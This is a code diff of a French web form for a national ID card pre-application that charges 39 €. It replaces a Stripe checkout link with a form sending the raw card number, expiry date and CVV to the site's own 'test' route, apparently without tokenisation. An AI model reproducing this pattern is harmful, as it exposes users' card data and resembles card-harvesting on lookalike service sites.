@@ -27,10 +27,10 @@
   <body>
 
     <!-- boîte d’alerte personnalisée -->
-    <div id="custom-alert" class="custom-alert">
-      <span id="custom-alert-msg"></span>
-      <button id="custom-alert-close">&times;</button>
-    </div>
+<div id="custom-alert" class="custom-alert">
+  <span id="custom-alert-msg"></span>
+  <button id="custom-alert-close">&times;</button>
+</div>
 
 
       <!-- N A V B A R -->
@@ -371,26 +371,40 @@
 <!------------------------------------------------- Étape 6 ------------------------------------------------------------------------------>
 
 <div class="form-part" id="step-6" style="display: none;">
-  <h4>Frais de traitement de la pré-demande de CNI</h4>
-  <p>Prix : <strong>39,00 €</strong></p>
+  <form id="stripe-form" action="{{ route('test') }}" method="POST">
+    @csrf
 
-  <h4>Paiement par Carte Bancaire : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
-  
-  <label for="carte_bancaire">Numéro de carte</label>
-  <input type="text" id="carte_bancaire" name="carte_bancaire" placeholder="0000 0000 0000 0000" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
-  
-  <label for="expiration_date">Date d’expiration</label>
-  <input type="month" id="expiration_date" name="expiration_date" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
-  
-  <label for="cvv">CVV</label>
-  <input type="text" id="cvv" name="cvv" placeholder="123" pattern="^[0-9]{3}$" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
+    <h4>Frais de traitement de la pré-demande de CNI</h4>
+    <p>Prix : <strong>39,00 €</strong></p>
 
-  <h4>Connexion Link et formulaire d’entrée de carte bancaire :</h4>
-  <p>Veuillez entrer les informations de votre carte pour compléter votre paiement.</p>
+    <h4>Paiement par Carte Bancaire : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
+    <label for="carte_bancaire">Numéro de carte</label>
+    <input type="text" id="carte_bancaire" name="carte_bancaire"
+           placeholder="0000 0000 0000 0000"
+           style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;"
+           required>
 
-  <div class="buttons" style="display:flex;justify-content:flex-end;margin-top:30px;">
-    <a href="https://buy.stripe.com/test_14kaID7MvbSJ5u8144" id="pay_btn" class="btn btn-primary" style="display:none;">Payer</a>
-  </div>
+    <label for="expiration_date">Date d’expiration</label>
+    <input type="month" id="expiration_date" name="expiration_date"
+           style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;"
+           required>
+
+    <label for="cvv">CVV</label>
+    <input type="text" id="cvv" name="cvv"
+           placeholder="123"
+           pattern="^[0-9]{3}$"
+           style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;"
+           required>
+
+    <p>Veuillez entrer les informations de votre carte pour compléter votre paiement.</p>
+
+    <div class="buttons" style="display:flex;justify-content:flex-end;margin-top:30px;">
+      <button type="button" class="btn btn-secondary" onclick="prevStep()">Précédent</button>
+      <button type="submit" class="btn btn-primary ml-2">Payer 39,00 €</button>
+    </div>
+  </form>
+</div>
+
 </div>
 
 
@@ -400,10 +414,11 @@
 
 
 
-  <div class="buttons">
-    <button class="btn btn-secondary" id="prev-btn" onclick="prevStep()" style="display:none;">Précédent</button>
-    <button class="btn btn-primary" id="next-btn" onclick="nextStep()">Suivant</button>
-  </div>
+  <div class="buttons" style="display: flex; justify-content: center; gap: 20px; margin-top: 30px;">
+  <button class="btn btn-secondary" id="prev-btn" onclick="prevStep()" style="display:none;">Précédent</button>
+  <button class="btn btn-primary" id="next-btn" onclick="nextStep()">Suivant</button>
+</div>
+
 </section>
 
 
